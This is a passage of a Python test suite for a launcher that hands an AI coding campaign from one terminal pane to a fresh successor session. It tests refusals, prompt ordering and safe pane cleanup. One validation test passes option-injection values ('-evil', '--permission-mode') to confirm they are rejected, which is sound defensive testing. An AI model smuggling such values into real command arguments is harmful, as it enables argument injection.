    """(work_tree, head_sha) for a repository whose `origin` is a local bare clone."""
    origin, work = tmp_path / "origin.git", tmp_path / "work"
    if work.exists():
        return str(work), REVAL_LOCAL_HEAD_CACHE[str(work)]
    subprocess.run(["git", "init", "--bare", "-b", "main", str(origin)],
                   capture_output=True, check=True)
    subprocess.run(["git", "init", "-b", "main", str(work)], capture_output=True, check=True)
    for cfg in (["user.email", "t@example.com"], ["user.name", "t"]):
        subprocess.run(["git", "-C", str(work), "config", *cfg], capture_output=True, check=True)
    (work / "f.txt").write_text("one\n", encoding="utf-8")
    subprocess.run(["git", "-C", str(work), "add", "f.txt"], capture_output=True, check=True)
    subprocess.run(["git", "-C", str(work), "commit", "-m", "one"], capture_output=True, check=True)
    subprocess.run(["git", "-C", str(work), "remote", "add", "origin", str(origin)],
                   capture_output=True, check=True)
    subprocess.run(["git", "-C", str(work), "push", "-u", "origin", "main"],
                   capture_output=True, check=True)
    head = subprocess.run(["git", "-C", str(work), "rev-parse", "HEAD"],
                          capture_output=True, text=True, check=True).stdout.strip()
    REVAL_LOCAL_HEAD_CACHE[str(work)] = head
    return str(work), head


def _armed(state_dict, head):
    """Add a minimal VALID `queue_revalidation` receipt attesting `head`, and stamp every queued
    child at it — the gate is universal since #840, so a receipt-less campaign is refused."""
    claim = {"kind": "cause", "quoted_from_body": "the cause is X",
             "checked_against": f"hooks/launcher_lib.py@{head}",
             "evidence": "read at that sha; still holds", "verdict": "holds"}
    children = {}
    for issue in state_dict["issues"]:
        if issue.get("status") == "queued":
            issue["validated_against"] = head
            children[str(issue["number"])] = {
                "body_hash": "9" * 64, "from_sha": head, "to_sha": head,
                "extraction": "paths", "depth": "quick", "outcome": "still_valid",
                "claims": [dict(claim)], "validated_at": 1_754_000_000}
    state_dict["queue_revalidation"] = {"version": 1, "extractor_version": 1,
                                        "validated_head": head, "children": children}
    return state_dict


def _state(tmp_path, **over):
    state = {"campaign": "epic-667", "epic": 667, "generation": 3,
             # #682: a campaign state needs the project, or there is no valid
             # `/rawgentic:switch <project>` to head the resume prompt with.
             "project": PROJECT,
             "session_mode": "fresh-session",
             "issues": [{"number": 611, "status": "merged"},
                        {"number": 612, "status": "queued"}]}
    state.update(over)
    _work, head = _local_repo_with_origin(tmp_path)
    if "queue_revalidation" not in state:
        _armed(state, head)
    p = tmp_path / "driver-state.json"
    p.write_text(json.dumps(state), encoding="utf-8")
    return p


def _handoff_argv(state, tmp_path, **over):
    work, _head = _local_repo_with_origin(tmp_path)
    kw = {"--driver-state": str(state), "--anchor-pane": "w1:p1", "--name": "child4",
          "--project-root": work, "--project": PROJECT, "--cwd": str(REPO_ROOT),
          "--registry": "/reg.jsonl", "--transcript-dir": str(tmp_path),
          "--goal-condition": "keep going", "--launch-mode": "fresh",
          "--herdr-mode": "herdr",
          # #726 — the boundary CLI now declares the predecessor's in-flight work. These cases
          # are about the fence and the launch ladder, so they attest to none.
          "--inflight-none": None}
    kw.update(over)
    argv = ["handoff"]
    for k, v in kw.items():
        if v is False:          # an explicit drop, so a case can replace a defaulted flag
            continue
        argv += [k] if v is None else [k, v]
    return argv


class TestHandoffCLI:
    """#611 Step-11 High 1 (conf 1.00): `rg` found no non-test invocation of `perform_handoff`
    — the module was builders nobody called. This subcommand IS the caller; the workspace
    `*-resume.sh` launcher invokes it (the launchers live outside any git repo, so the logic
    lives here where it can be tested and shipped — D-11 finding 2)."""

    @pytest.fixture(autouse=True)
    def _no_live_issue_probe(self, monkeypatch):
        """#695: `handoff` now builds a LIVE `gh api graphql` issue-state probe by default.

        These tests drive it against synthetic campaigns whose fixtures reuse issue numbers that
        really are merged in this repo (682, 687), so with the probe on, a fake `queued` queue
        resolves to a genuinely `complete` campaign and the CLI correctly refuses to hand off —
        which looked like a regression and is really the feature working on real data.

        Switched off here so these assertions test the CLI rather than GitHub's current state.
        `TestTheIssueProbeDefaultsOn` pins that production does NOT get this treatment.
        """
        monkeypatch.setenv(ll.ISSUE_PROBE_ENV, "0")

    def test_the_subcommand_exists(self) -> None:
        proc = _cli("handoff", "--help")
        assert proc.returncode == 0
        assert "--driver-state" in proc.stdout and "--anchor-pane" in proc.stdout

    def test_a_campaign_with_nothing_ready_refuses_without_touching_herdr(self, tmp_path) -> None:
        """Every child merged => `complete`, not `ready`. Splitting a pane here would spawn a
        successor with no work at all."""
        state = _state(tmp_path, issues=[{"number": 611, "status": "merged"}])
        proc = _cli(*_handoff_argv(state, tmp_path))
        assert proc.returncode == 3, proc.stderr
        assert "complete" in (proc.stdout + proc.stderr)

    @pytest.mark.parametrize("mode", ["single_session", "pane_less"])
    def test_only_the_herdr_verdict_runs_this_sequence(self, tmp_path, mode) -> None:
        """`single_session` means keep the current loop; `pane_less` means use the retained
        `claude --print` path. Accepting either here would split a pane on a project that never
        wanted one and then retire the predecessor after launching by a different mechanism
        entirely (#611 Step-11 pass-3 Medium 4)."""
        proc = _cli(*_handoff_argv(_state(tmp_path), tmp_path, **{"--herdr-mode": mode}))
        assert proc.returncode == 2, proc.stdout
        assert "invalid choice" in proc.stderr

    def test_a_single_session_campaign_is_not_handed_off(self, tmp_path) -> None:
        """A driver-state with no `session_mode` is documented to mean byte-identical
        single-session behaviour. The previous revision forced FRESH_SESSION_MODE, so it would
        have launched a successor and retired the predecessor for such a campaign
        (#611 Step-11 pass-3 High 2)."""
        state = _state(tmp_path)
        payload = json.loads(state.read_text(encoding="utf-8"))
        del payload["session_mode"]
        state.write_text(json.dumps(payload), encoding="utf-8")
        proc = _cli(*_handoff_argv(state, tmp_path))
        assert proc.returncode == 3, proc.stdout
        assert "single_session" in proc.stdout

    def test_an_unarmed_launcher_is_refused(self, tmp_path) -> None:
        """Absence of the assertion must not read as support — the same lesson the 8a review
        taught about `--launcher-herdr`."""
        proc = _cli(*_handoff_argv(_state(tmp_path), tmp_path))
        assert proc.returncode == 3, proc.stdout
        assert "launcher" in proc.stdout.lower()

    def test_a_resume_first_launcher_is_refused(self, tmp_path) -> None:
        proc = _cli(*_handoff_argv(_state(tmp_path), tmp_path, **{"--launcher-armed": None}))
        assert proc.returncode == 3, proc.stdout
        assert "fresh" in proc.stdout.lower()

    def test_the_resume_prompt_comes_from_driver_lib_not_a_hand_written_string(self,
                                                                               tmp_path) -> None:
        """AC6's sibling requirement: the successor is told to rebuild from durable state. The
        canonical wording is `driver_lib`'s, so the two cannot drift apart."""
        sys.path.insert(0, str(HOOKS))
        import driver_lib as dl  # noqa: PLC0415

        state = json.loads(_state(tmp_path).read_text(encoding="utf-8"))
        work, head = _local_repo_with_origin(tmp_path)
        # #840 — an armed campaign cannot produce a disposition without a freshly observed head;
        # the pure side takes the SHA, the launcher side takes the repo root and observes it itself.
        disposition = dl.fresh_session_handoff(state, mode=dl.FRESH_SESSION_MODE,
                                               observed_head=head)
        assert disposition["outcome"] == "ready"
        # #840 made this a result object rather than `str | None`, so a revalidation refusal
        # could stop being reported as "the epic finished". The prompt itself is unchanged.
        result = ll.resume_prompt_for_state(state, project=PROJECT, repo_root=work)
        assert result["outcome"] == "ready", result
        assert result["prompt"] == disposition["resume_prompt"]
        assert "612" in disposition["resume_prompt"]

    def test_the_condition_can_be_read_verbatim_from_a_transcript(self, tmp_path) -> None:
        """AC6: never retype or summarise the goal — read the predecessor's own last unmet row."""
        t = tmp_path / "pred.jsonl"
        t.write_text(TRANSCRIPT_OK, encoding="utf-8")
        proc = _cli("read-goal-condition", "--transcript", str(t))
        assert proc.returncode == 0, proc.stderr
        assert json.loads(proc.stdout)["condition"] == GOAL_CONDITION

    def test_no_unmet_goal_in_the_predecessor_is_an_explicit_refusal(self, tmp_path) -> None:
        t = tmp_path / "pred.jsonl"
        t.write_text('{"type":"user"}\n', encoding="utf-8")
        proc = _cli("read-goal-condition", "--transcript", str(t))
        assert proc.returncode == 3, proc.stdout
        assert "no unmet goal" in proc.stderr.lower()

    def test_the_cli_drives_perform_handoff_with_the_derived_prompt(self, tmp_path,
                                                                    monkeypatch) -> None:
        """In-process so the whole wiring is observable: driver-state -> disposition ->
        resume prompt -> perform_handoff. Without this, `handoff` could parse arguments
        perfectly and still never reach the sequence."""
        seen = {}

        def fake(**kw):
            seen.update(kw)
            return {"ok": True, "results": {}, "steps": [], "new_pane": "w1:pZZ",
                    "session_id": "s", "cleanup": None, "truncated": False,
                    "failed_step": None}

        monkeypatch.setattr(ll, "perform_handoff", fake)
        # #927 PR 2: the boundary now PROBES before launching, and it needs both tiers — a
        # capability AND a live anchor pane. Faked here for determinism: unfaked, this test
        # depends on whether the machine running the suite happens to have herdr and a pane
        # called `w1:p1`, and a pane-less CI box would take the (correct) inline branch and
        # never reach `perform_handoff` at all. The subject of this test is argument
        # threading, so the probe is a precondition, not the thing under test.
        monkeypatch.setattr(ll, "transport_probe", lambda **kw: (True, True, "probe_ok"))
        monkeypatch.setattr(ll, "_pane_inventory", lambda runner=None: {"w1:p1"})
        rc = ll.main(_handoff_argv(_state(tmp_path), tmp_path,
                                   **{"--launcher-armed": None,
                                      "--fresh-launch-supported": None}))
        assert rc == 0, seen
        assert seen["anchor_pane"] == "w1:p1"
        assert seen["goal_condition"] == "keep going"
        assert "612" in seen["resume_prompt"], "the successor must be told which child is next"
        assert seen["launch_mode"] == "fresh"
        assert seen["transcript_dir"] == str(tmp_path)
        # The boundary correlation clause rides the same prompt (section 4.5 / finding C6).
        assert "resolution b:epic-667:4#1" in seen["resume_prompt"]
        assert "task list back up" in seen["resume_prompt"]


class TestOwnershipDiscipline:
    """#611 Step-11 High 3 / Medium 5: a tentative successor pane must never be leaked, and a
    failed predecessor teardown must not be reported as a successful handoff."""

    def test_every_post_split_failure_closes_the_tentative_pane(self) -> None:
        for fail_at in ("herdr agent start", "herdr agent wait", "herdr pane send-text",
                        "herdr pane send-keys"):
            r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                       fail_on=fail_at)
            out = ll.perform_handoff(runner=r, **_handoff())
            assert out["ok"] is False, fail_at
            assert "cleanup_tentative_pane" in [s["kind"] for s in out["steps"]], \
                f"{fail_at}: tentative pane leaked"
            closed = [c for c in r.calls if c[:3] == ["herdr", "pane", "close"]]
            assert closed and closed[0][3] == "w1:pZZ", f"{fail_at}: wrong pane closed"
            assert not any(c[3] == "w1:p1" for c in closed), \
                f"{fail_at}: predecessor must never be closed on a failed handoff"

    def test_failed_verification_also_closes_the_tentative_pane(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK,
                    "herdr pane get": json.dumps({"result": {"pane": {}}})})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "spawned"
        assert out["cleanup"] and "closed tentative pane" in out["cleanup"]

    def test_happy_path_does_not_close_the_successor(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True
        assert out["cleanup"] is None
        closed = [c for c in r.calls if c[:3] == ["herdr", "pane", "close"]]
        assert [c[3] for c in closed] == ["w1:p1"], "only the predecessor is retired"

    def test_a_failed_predecessor_teardown_is_not_reported_as_success(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                   fail_on="herdr pane close")
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["failed_step"] == "teardown_predecessor"

    def test_bad_arguments_never_create_a_pane(self) -> None:
        """Validation happens before the split, so a refusal cannot leak a pane."""
        for over in ({"name": "-evil"}, {"goal_condition": "  "},
                     {"readiness_timeout_ms": 1000}, {"launch_mode": "--permission-mode"},
                     {"resume_prompt": "   "}):
            r = Runner({"herdr pane split": SPLIT_OK})
            with pytest.raises(ll.LauncherError):
                ll.perform_handoff(runner=r, **_handoff(**over))
            assert r.calls == [], f"{over}: a command ran before validation failed"

    def test_a_runner_exception_after_the_split_still_cleans_up(self) -> None:
        calls = []

        def boom(argv, timeout=180):
            calls.append(argv)
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, PANE_LIST_ANCHOR_ONLY)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, SPLIT_OK)
            if argv[:3] == ["herdr", "pane", "close"]:
                return FakeProc(0)
            raise subprocess.SubprocessError("herdr died")

        out = ll.perform_handoff(runner=boom, **_handoff())
        assert out["ok"] is False
        assert any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:pZZ" for c in calls)


# ---------------------------------------------------------------------------
# #611 Step-11 High 1 — the successor must actually be told to RESUME
# ---------------------------------------------------------------------------

class TestResumePrompt:
    """The second revision armed `/goal` and stopped there. A guarded session that is never
    given work just sits at an empty prompt: the goal only re-prompts once the session tries to
    STOP, so the run would stall silently and the predecessor would already be retired."""

    def test_resume_prompt_is_sent_after_the_bind_and_after_the_goal(self) -> None:
        """This test has now been inverted TWICE, and the history is the point.

        Its original form asserted the prompt came after the goal. #694 inverted it: the bind
        leads, the work follows, the guard is armed last. #989 inverted it BACK, for a reason
        neither earlier revision had — both the bind and the goal are BARE SLASH COMMANDS, and a
        bare slash command pasted into a busy pane is queued rather than executed (#718). So the
        two slash commands take the idle windows and the prose prompt takes the busy one.
        """
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert _sent(r) == [f"/rawgentic:switch {PROJECT}", f"/goal {GOAL_CONDITION}",
                            RESUME_PROMPT]

    def test_resume_prompt_waits_until_the_BIND_is_VERIFIED_landed(self) -> None:
        """Not merely 'sent after' — sent after the successor's own registry row was observed. A
        prompt handed to a session that never bound cannot read anything under projects/, and the
        pane is closed when `project_switched` exhausts."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry="")))            # registry row never appears
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert _sent(r) == [f"/rawgentic:switch {PROJECT}"], \
            "resume prompt sent despite no bind"
        assert not _predecessor_closed(r)

    def test_the_PROMPT_waits_until_the_GOAL_is_verified_armed(self) -> None:
        """#989 inverted this dependency, and the new direction is strictly safer.

        It used to read "the goal waits until the prompt is verified landed", so a failed arm left
        a successor already working with no guard. Now the guard is proven FIRST, so a failure
        costs a pane that was never handed any work — there is no unguarded window at all.
        """
        marker = "[rawgentic-midchild:4:7]"
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            resume_prompt=f"{marker} {RESUME_PROMPT}", prompt_marker=marker,
            read_text=Artifacts(transcript="")))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert RESUME_PROMPT not in " ".join(_sent(r)), \
            "the prompt must never reach a successor whose guard did not arm"
        assert not _predecessor_closed(r)

    def test_a_handoff_with_no_resume_prompt_is_refused_before_anything_runs(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK})
        with pytest.raises(ll.LauncherError):
            ll.perform_handoff(runner=r, **_handoff(resume_prompt=""))
        assert r.calls == []

    def test_a_prompt_carrying_a_bind_ANYWHERE_is_refused_before_anything_runs(self) -> None:
        """#694 inverted #682's precondition. The bind is SEND 1, so a prompt that also binds makes
        the successor run the switch skill twice. Position does not matter — a mid-prompt bind is
        the same double-bind — which is why the guard looks for the directive rather than checking a
        prefix. Refused BEFORE the split, like every other caller mismatch, so the refusal never
        leaves a pane behind."""
        r = Runner({"herdr pane split": SPLIT_OK})
        with pytest.raises(ll.LauncherError, match="carries"):
            ll.perform_handoff(runner=r, **_handoff(
                resume_prompt="Resume epic #667: git fetch origin, then /rawgentic:switch rawgentic."))
        assert r.calls == [], "a pane was created before the caller mismatch was caught"

    def test_a_prompt_with_no_bind_directive_is_exactly_what_is_expected_now(self) -> None:
        """The pre-#694 version of this test asserted such a prompt was REFUSED. It is now the
        canonical shape, because the launcher supplies the bind itself."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            resume_prompt="Resume epic #667 and run the next child."))
        assert out["ok"] is True, out

    def test_resume_prompt_step_is_named_in_the_output(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert "send_resume_prompt" in [s["kind"] for s in out["steps"]]

    def test_a_failed_resume_prompt_aborts_and_keeps_the_predecessor(self) -> None:
        """A send that fails here is the worst case available: the guard is armed but the
        successor has no work. Retiring the predecessor now would strand the whole run."""
        calls = []

        def runner(argv, timeout=180):
            calls.append(argv)
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, PANE_LIST_ANCHOR_ONLY)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, SPLIT_OK)
            if argv[:3] == ["herdr", "pane", "get"]:
                return FakeProc(0, PANE_GET_OK)
            if argv[:4] == ["herdr", "pane", "send-text", "w1:pZZ"] and argv[4] == RESUME_PROMPT:
                return FakeProc(1)
            return FakeProc(0)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "send_resume_prompt"
        assert not any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:p1" for c in calls)


# ---------------------------------------------------------------------------
# #611 Step-11 High 1 — typed launch modes, not caller-supplied claude args
# ---------------------------------------------------------------------------

class TestLaunchModes:
    def test_fresh_carries_no_claude_args(self) -> None:
        assert ll.claude_args_for_launch_mode("fresh") == []
        argv = ll.build_agent_start_argv(name="child4", pane="w1:pZZ",
                                         claude_args=ll.claude_args_for_launch_mode("fresh"))
        assert "--" not in argv and "--continue" not in argv

    def test_resume_mode_was_removed_not_merely_discouraged(self) -> None:
        """#611 Step-11 pass-4 High 1. A resumed successor can already own a registry row and an
        unmet goal row, so its evidence is temporal, never causally bound to THIS handoff.
        #569's contract is a FRESH successor with no `--resume`, so the mode was never needed —
        deleting it removes the whole stale-evidence class rather than documenting around it."""
        assert "resume" not in ll.LAUNCH_MODES
        with pytest.raises(ll.LauncherError):
            ll.claude_args_for_launch_mode("resume")

    @pytest.mark.parametrize("bad", ["", None, "FRESH", "--permission-mode", "print", 7,
                                     "resume"])
    def test_an_unknown_launch_mode_is_refused(self, bad) -> None:
        with pytest.raises(ll.LauncherError):
            ll.claude_args_for_launch_mode(bad)

    def test_fresh_mode_never_reloads_the_predecessor_transcript(self) -> None:
        """`fresh_session_available` only advertises fresh mode for a launcher that positively
        supports a NO-`--resume` launch (driver_lib Step-11 F1). A `fresh` handoff that quietly
        passed `--continue` would defeat exactly that."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff(launch_mode="fresh"))
        start = [c for c in r.calls if c[:3] == ["herdr", "agent", "start"]][0]
        assert "--continue" not in start and "--resume" not in start


# ---------------------------------------------------------------------------
# #611 Step-11 Medium 4 — the evidence must be FRESH and launch-bound
# ---------------------------------------------------------------------------

class TestEvidenceIsLaunchBound:
    """`--continue`/`--resume` mean the successor can carry a session id that ALREADY owns a
    registry row and an unmet goal row. Reading the whole file would then authorise teardown on
    the predecessor's own history."""

    def test_a_pre_launch_registry_row_does_not_count(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry_pre=REGISTRY_OK, registry="")))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)

    def test_a_pre_launch_goal_row_does_not_count(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(transcript_pre=TRANSCRIPT_OK, transcript="")))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert not _predecessor_closed(r)

    def test_history_before_the_launch_does_not_hide_a_real_new_row(self) -> None:
        """The offset must not be so blunt that a busy artifact never passes."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry_pre='{"session_id":"older"}\n',
                                transcript_pre='{"unrelated":1}\n')))
        assert out["ok"] is True, out

    def test_a_goal_row_for_a_DIFFERENT_condition_does_not_count(self) -> None:
        """Launch-binding by content: the armed guard must be the one we sent, not any unmet
        goal that happens to be in the transcript."""
        other = json.dumps({"attachment": {"type": "goal_status", "met": False,
                                           "sentinel": True, "condition": "someone else's run"}})
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=Artifacts(transcript=other)))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"

    def test_a_truncated_condition_is_matched_in_its_TRUNCATED_form(self) -> None:
        """A capped goal arms the truncated text, so that is what the transcript will carry.
        Matching against the original would fail forever and teardown could never fire."""
        long_condition = "y" * 5000
        armed, truncated = ll.armed_condition(long_condition)
        assert truncated is True and len(armed) < len(long_condition)
        row = json.dumps({"attachment": {"type": "goal_status", "met": False,
                                         "condition": armed}})
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            goal_condition=long_condition, read_text=Artifacts(transcript=row)))
        assert out["ok"] is True, out
        assert out["truncated"] is True

    def test_a_missing_artifact_pre_launch_is_offset_zero_not_a_crash(self) -> None:
        """The successor's transcript genuinely does not exist before it is spawned, so the
        offset capture must treat 'unreadable' as 'nothing here yet' — not abort the handoff."""
        arts = Artifacts()
        seen = {"transcript": 0}

        def reader(path):
            if path == REGISTRY_PATH:
                return arts(path)
            seen["transcript"] += 1
            if seen["transcript"] == 1:
                raise FileNotFoundError("no such file")
            return TRANSCRIPT_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is True, out


class TestBaselineIntegrity:
    """#611 Step-11 pass-3 High 1. The previous revision mapped EVERY `OSError` to offset 0, so
    an artifact that exists but is momentarily unreadable was treated as empty — and the whole
    pre-existing file then counted as this launch's evidence."""

    def test_an_unreadable_registry_refuses_the_handoff(self) -> None:
        def reader(path):
            if path == REGISTRY_PATH:
                raise PermissionError("locked")
            return TRANSCRIPT_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "registry_baseline_unreadable"
        assert r.calls == [] or not any(c[:3] == ["herdr", "pane", "split"] for c in r.calls), \
            "no baseline means no launch — nothing should have been created"

    def test_an_unreadable_successor_transcript_refuses_after_the_split(self) -> None:
        arts = Artifacts()

        def reader(path):
            if path == REGISTRY_PATH:
                return arts(path)
            raise PermissionError("locked")

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "transcript_baseline_unreadable"
        assert out["cleanup"] and "closed tentative pane" in out["cleanup"]
        assert not _predecessor_closed(r)

    def test_a_missing_file_is_still_offset_zero_not_a_refusal(self) -> None:
        """`FileNotFoundError` is the ONE case where 'unreadable' honestly means 'empty'."""
        assert ll._baseline(_raise(FileNotFoundError("nope")), "/x") == (0, ll._digest(""))
        assert ll._baseline(_raise(PermissionError("locked")), "/x") is None
        assert ll._baseline(_raise(UnicodeDecodeError("utf-8", b"\xf0", 0, 1, "x")), "/x") is None
        assert ll._baseline(lambda _p: "abcd", "/x") == (4, ll._digest("abcd"))

    def test_a_shrunken_artifact_voids_the_baseline(self) -> None:
        """Rotation or truncation makes the offset point somewhere else entirely, so positional
        evidence is meaningless — it must fail, not compare against the wrong region."""
        assert ll._tail("short", (100, ll._digest("x" * 100))) is None
        assert ll._tail("abcdef", (3, ll._digest("abc"))) == "def"

    def test_a_same_length_replacement_voids_the_baseline(self) -> None:
        """#611 Step-11 pass-4 High 1: length alone cannot see a file REPLACED at the same or a
        greater length — and `registry_prune.py` legitimately rewrites the registry wholesale
        via `os.replace`. The prefix digest is what notices."""
        assert ll._tail("XXXdef", (3, ll._digest("abc"))) is None
        assert ll._tail("abcdef", (3, ll._digest("abc"))) == "def"

    def test_a_replaced_registry_does_not_authorize_teardown(self) -> None:
        reads = {"n": 0}
        arts = Artifacts()

        def reader(path):
            if path != REGISTRY_PATH:
                return arts(path)
            reads["n"] += 1
            # baseline is one history; a concurrent prune then replaces the whole file with a
            # LONGER one that happens to carry the successor's id
            return "old-history\n" if reads["n"] == 1 else "pruned-and-rebuilt\n" + REGISTRY_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)

    def test_a_rotated_registry_does_not_authorize_teardown(self) -> None:
        reads = {"n": 0}

        arts = Artifacts()

        def reader(path):
            if path != REGISTRY_PATH:
                return arts(path)
            reads["n"] += 1
            # a long history at baseline, then the file is rotated to a short new one that
            # happens to contain the successor's id
            return "x" * 500 if reads["n"] == 1 else REGISTRY_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)


class TestUncertainSplitReporting:
    """#611 Step-11 pass-3 Medium 3 and pass-4 High 3. herdr can CREATE a pane and still fail
    to describe it, so the leak must be SURFACED — but it must never be guessed at. Pass 3
    closed the single new pane in the inventory diff; pass 4 showed that is unsound, because
    cardinality is not attribution: if our split created nothing and an unrelated session split
    concurrently, that one new pane is someone else's live session."""

    def _runner(self, split_stdout, split_rc=0, before=("w1:p1",), after=("w1:p1", "w1:pNEW")):
        listings = [json.dumps({"result": {"panes": [{"pane_id": p} for p in before]}}),
                    json.dumps({"result": {"panes": [{"pane_id": p} for p in after]}})]

        def runner(argv, timeout=180):
            runner.calls.append(list(argv))
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, listings.pop(0) if listings else listings_last(listings))
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(split_rc, split_stdout)
            return FakeProc(0)

        def listings_last(_l):
            return json.dumps({"result": {"panes": [{"pane_id": p} for p in after]}})

        runner.calls = []
        return runner

    @pytest.mark.parametrize("stdout,rc,step", [
        ("not json", 0, "split_response_unparseable"),
        ("", 1, "split"),
    ])
    def test_a_pane_that_appeared_is_reported_and_NEVER_closed(self, stdout, rc, step) -> None:
        r = self._runner(stdout, split_rc=rc)
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["failed_step"] == step
        assert out["cleanup"] and "POSSIBLE ORPHAN" in out["cleanup"]
        assert "w1:pNEW" in out["cleanup"], "the operator must be told which pane to check"
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls), \
            "ownership is unprovable here — closing ANY pane risks killing a live session"

    def test_a_concurrent_foreign_pane_is_not_closed(self) -> None:
        """The pass-4 finding in its exact shape: our split creates nothing, an unrelated
        session splits between the two inventories, and the diff is exactly one pane. Pass 3
        would have closed it."""
        r = self._runner("not json", after=("w1:p1", "w1:pSOMEONE_ELSE"))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)
        assert out["cleanup"] and "w1:pSOMEONE_ELSE" in out["cleanup"]

    def test_nothing_created_means_nothing_to_report(self) -> None:
        r = self._runner("not json", after=("w1:p1",))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["cleanup"] is None
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)

    def test_no_inventory_refuses_BEFORE_the_split(self) -> None:
        """#611 Step-11 pass-6 High 1. The inventory is the only thing that can later show a
        returned pane id is genuinely NEW, so it is required rather than best-effort: without it
        a well-formed response naming a pre-existing FOREIGN pane would be claimed as ours and
        closed on the next failure. Refusing is also the honest reading — if `pane list` does
        not work, herdr is not healthy enough to be splitting panes in."""
        calls = []

        def runner(argv, timeout=180):
            calls.append(list(argv))
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(1)
            return FakeProc(0, SPLIT_OK)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "pane_inventory_unavailable"
        assert not any(c[:3] == ["herdr", "pane", "split"] for c in calls), \
            "nothing may be created when ownership could never be proven"
        assert out["cleanup"] is None

    def test_a_malformed_inventory_MEMBER_voids_the_whole_inventory(self) -> None:
        """#611 Step-11 pass-7 High 1. Silently dropping an unparseable record yields a SHORT
        inventory that still looks authoritative — and a pane missing from it reads as "new",
        which is precisely the licence to close a foreign pane. A partial inventory is not one."""
        bad = json.dumps({"result": {"panes": [{"pane_id": "w1:p1"}, {"no_id": True}]}})
        assert ll._pane_inventory(lambda _a, timeout=180: FakeProc(0, bad)) is None

        def runner(argv, timeout=180):
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, bad)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, json.dumps({"result": {"pane_id": "w1:pFOREIGN"}}))
            return FakeProc(1)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "pane_inventory_unavailable"
        assert out["new_pane"] is None

    def test_a_foreign_pane_is_not_claimed_when_the_inventory_is_missing(self) -> None:
